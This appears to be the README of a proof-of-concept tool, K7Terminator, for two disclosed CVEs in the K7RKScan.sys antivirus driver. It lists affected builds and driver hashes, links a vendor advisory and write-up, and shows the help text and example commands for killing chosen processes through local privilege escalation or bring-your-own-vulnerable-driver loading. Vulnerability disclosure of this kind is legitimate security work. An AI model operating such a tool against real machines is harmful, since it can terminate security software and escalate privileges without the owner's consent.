# K7Terminator
- PoC for **CVE-2025-52915 & CVE-2025-1055** in **K7RKScan.sys** (K7 Ultimate Security)
- Affects:
  - **Legacy builds (15.1.0.6–7)** -> low-privilege abuse
  - **Current build (23.0.0.10)** -> admin/BYOVD abuse
- **[Vendor advisory issued](https://support.k7computing.com/index.php?/solutions/view-article/Advisory-issued-on-2nd-Sep-2025)**
- Full write-up & details: **[CVE-2025-52915: A BYOVD Evolution Story](https://blacksnufkin.github.io/posts/)**

**Driver hashes:**
- `K7RKScan.sys` **15.1.0.6** SHA256: `B16E217CDCA19E00C1B68BDFB28EAD53B20ADEABD6EDCD91542F9FBF48942877`
- `K7RKScan.sys` **23.0.0.10** SHA256: `5C6CE55A85F5D4640BD1485A72D0812BC4F5188EE966C5FE334248A7175D9040`

---

**Usage**

Place the vulnerable `K7RKScan.sys` in the same folder as the executable.  
Provide a **process name** or **PID**.  
(The file must be named `K7RKScan.sys`.)

```
K7RKScan Process Terminator - LPE + BYOVD (CVE-2025-52915) PoC

Usage: K7Terminator.exe [OPTIONS] --mode <mode>

Options:
  -m, --mode <mode>      lpe (wait for service) or byovd (load driver) [possible values: lpe, byovd]
  -p, --pid <pid>        Target process ID
  -n, --name <name>      Target process name(s)
  -l, --looper           Keep targeting processes
  -d, --driver <driver>  Driver path (default: ./K7RKScan.sys)
  -h, --help             Print help
  -V, --version          Print version

EXAMPLES:
  K7Terminator.exe -m lpe -n notepad.exe
  K7Terminator.exe -m byovd -p 1234
```